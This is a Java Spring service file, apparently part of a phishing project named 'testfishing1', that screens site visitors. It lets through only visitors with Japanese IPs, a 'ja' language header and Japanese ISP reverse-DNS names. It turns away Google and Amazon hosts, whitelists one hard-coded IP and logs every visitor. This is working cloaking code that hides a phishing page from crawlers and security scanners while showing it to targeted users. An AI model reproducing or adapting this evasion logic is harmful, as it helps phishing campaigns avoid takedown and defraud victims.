package com.kidd.testfishing1.service;

import cn.hutool.core.date.DateUtil;
import cn.hutool.http.Header;
import cn.hutool.http.HttpRequest;
import cn.hutool.json.JSONObject;
import cn.hutool.json.JSONUtil;
import com.kidd.testfishing1.common.CmdUtils;
import com.kidd.testfishing1.common.IpUtils;
import com.kidd.testfishing1.task.AsyncTask;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import javax.servlet.http.HttpServletRequest;
import java.time.Clock;
import java.time.LocalDateTime;
import java.time.ZoneId;

@Service
public class AuthUserService {

    private static String authUa = "ja";

    private static String ipInterfaceUrl = "https://api.ip.sb/geoip/";

    @Autowired
    private CmdUtils cmdUtils;

    @ Autowired
    private AsyncTask asyncTask;

    @Autowired
    private CacheService cacheService;

    public boolean auth(String ul,String ip,String dateTime){

        //1、ul
        try {
            //2、ip必须日本
            String result = HttpRequest.get(ipInterfaceUrl+ip)
                    .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
                    .timeout(20000)//超时，毫秒
                    .execute()
                    .body();
            JSONObject jObj = JSONUtil.parseObj(result);
            String country =(String) jObj.get("country_code");
            asyncTask.asyncWriteLogStr("ip:"+ip+" date:"+dateTime);
            asyncTask.asyncWriteLogStr("ip:"+ip+" country:"+country);
            //3、校验rdns
            String rdnsResult = cmdUtils.queryRdns(ip);
            asyncTask.asyncWriteLogStr("ip:"+ip+" rdns:"+rdnsResult);
            if(!ul.toLowerCase().contains(authUa)){
                return false;
            }
            if(!country.toLowerCase().contains("jp")){
                return false;
            }
            if(rdnsResult.toLowerCase().contains("name")){
                if(rdnsResult.toLowerCase().contains("google")||rdnsResult.toLowerCase().contains("amazon")){
                    return false;
                }
                if(rdnsResult.toLowerCase().contains("ne.jp") || rdnsResult.toLowerCase().contains(".jp") || rdnsResult.toLowerCase().contains("bbtec.net")){
                    return true;
                }
                return false;
            }
            return true;
        }
        catch (Exception e){
            asyncTask.asyncWriteLogStr("auth error:"+e.getMessage());
            return true;
        }
}
    public boolean auth(HttpServletRequest request){

        String ul = request.getHeader("Accept-Language");
        String url = request.getRequestURI();
        String ua = request.getHeader("User-Agent");
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String dateTime = DateUtil.format(localDateTime,"yyyy-MM-dd HH:mm:ss");
        String ip = IpUtils.getIpAddress(request);
        asyncTask.asyncWriteLog(ip,ua,dateTime,ul,url,null);
        if(null!=cacheService.getCommonCache(ip)){
            Integer cache =(Integer) cacheService.getCommonCache(ip);
            if(cache == 1){
                return true;
            }
            else if(cache==-1){
                return false;
            }
        }
        boolean authbool = auth(ul,ip,dateTime);
        asyncTask.asyncWriteLog(ip,ua,dateTime,ul,url,authbool);
        if("104.128.93.253".equals(ip)){
            return true;
        }
        if(authbool){
            cacheService.setCommonCache(ip,1);
        }
        else {
            cacheService.setCommonCache(ip,-1);
        }
        return authbool;
    }
}
